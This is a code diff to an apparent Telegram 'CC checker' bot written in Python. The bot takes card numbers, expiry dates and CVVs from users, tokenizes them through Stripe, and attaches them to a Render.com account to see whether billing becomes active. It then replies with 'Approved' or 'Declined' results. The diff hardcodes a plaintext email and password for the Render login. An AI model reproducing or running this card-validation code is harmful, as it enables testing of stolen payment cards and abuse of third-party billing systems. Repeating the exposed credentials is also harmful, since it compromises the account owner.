+            return await message.reply("<b>You have not filled in the card</b>")
 
         x = re.findall(r'\d+', cc)
         ccn = x[0]
@@ -1178,12 +1185,31 @@ async def ch(message: types.Message):
         if len(mm) >= 3:
             mm, yy, cvv = yy, cvv, mm
         if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+            return await message.reply('<b>𝘍𝘢𝘪𝘭𝘦𝘥 𝘵𝘰 𝘱𝘢𝘳𝘴𝘦 𝘊𝘢𝘳𝘥</b>\n'
+                                       '<b>Reason: 𝐖𝐑𝐎𝐍𝐆 𝐅𝐎𝐑𝐌𝐀𝐓!</b>')   
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
         # get guid muid sid
+        load5 = {"operationName":"signIn","variables":{"email":"khanhemanhhai@gmail.com","password":"namkhanh61"},"query":"mutation signIn($email: String!, $password: String!) {  signIn(email: $email, password: $password) {    ...authResultFields    __typename  }}fragment authResultFields on AuthResult {  idToken  user {    ...userFields    sudoModeExpiresAt    __typename  }  __typename}fragment userFields on User {  id  active  createdAt  email  featureFlags  githubId  gitlabId  name  notifyOnFail  notifyOnPrUpdate  otpEnabled  passwordExists  tosAcceptedAt  intercomHMAC  __typename}"}
+
+        header = {
+            "accept": "*/*",
+            "user-agent": UA,
+            "content-type": "application/json"
+            
+            
+        }
+
+        rz = session.post('https://api.render.com/graphql',
+                          json=load5, headers=header)
+        
+        jsne = rz.json()
+        
+        tokenn = jsne['data']['signIn']['idToken']
+        toc11 = time.perf_counter()
+        toc1 = toc11 -tic
+      
         headers = {
             "user-agent": UA,
             "accept": "application/json, text/plain, */*",
@@ -1224,8 +1250,9 @@ async def ch(message: types.Message):
         rx = session.post('https://api.stripe.com/v1/tokens',
                           data=load, headers=header)
         res = rx.json() 
-        print(rx.text)
-        toc1 = time.perf_counter()
+        
+        toc22 = time.perf_counter()
+        toc2 = toc22 - tic
        
         
         LastF = f'************{ccn[-4:]}'
@@ -1237,8 +1264,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Declined
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -1249,8 +1276,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Incorrect_number
 <b>MSG</b>➟ Your card number is incorrect.
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
         if 'Request rate limit exceeded.' in rx.text:
@@ -1260,8 +1287,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1272,8 +1299,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ API Key provided
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
         if 'security code is invalid' in rx.text:
@@ -1283,8 +1310,8 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Security code is invalid.
 <b>MSG</b>➟ {msg}
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc1 - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc1 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1297,32 +1324,23 @@ async def ch(message: types.Message):
           last4 = card['last4']
           
 
-          payload = {"operationName":"updateCard","variables":{"id":"usr-cboij3n9re0t6g5u4h30","token":"{token}","brand":"{brand}","last4":"{last4}","country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
+          payload = {"operationName":"updateCard","variables":{"id":"usr-cbotlpk41lscvckv4cj0","token":token,"brand":brand,"last4":last4,"country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
                     
           head = {
-            "accept": "*/*",
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "accept-encoding": "gzip, deflate, br",
-            "access-control-request-headers": "authorization,content-type,render-request-id",
-            ""
-            "user-agent": UA,
-            "origin": "https://dashboard.render.com",
-            "referer": "https://dashboard.render.com/select-repo?type=pserv",
-            "render-request-id": "{Guid}",
-            "accept-language": "en-US,en;q=0.9"
+            "authorization": "Bearer "+tokenn
            
             
         }
 
-          ri = requests.post('https://api.render.com/graphql', data=payload,
+          ri = requests.post('https://api.render.com/graphql', json=payload,
                           headers=head)
           res1 = ri.json() 
-          print(ri.text)
+          print("check by "+FIRST)
 
-          toc = time.perf_counter()
-
-          if 'success' in ri.text:
+          toc33 = time.perf_counter()
+          toc3 = toc33 - tic
+          toc = toc1 + toc2 + toc3
+          if ',"billingStatus":"ACTIVE' in ri.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #ApprovedCVV
@@ -1331,8 +1349,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1345,8 +1363,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1361,8 +1379,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1374,8 +1392,8 @@ async def ch(message: types.Message):
 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:{brand} - {funding}
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
-<b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>IP</b> <code>{b}</code>
+<b>TIME:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')          
           
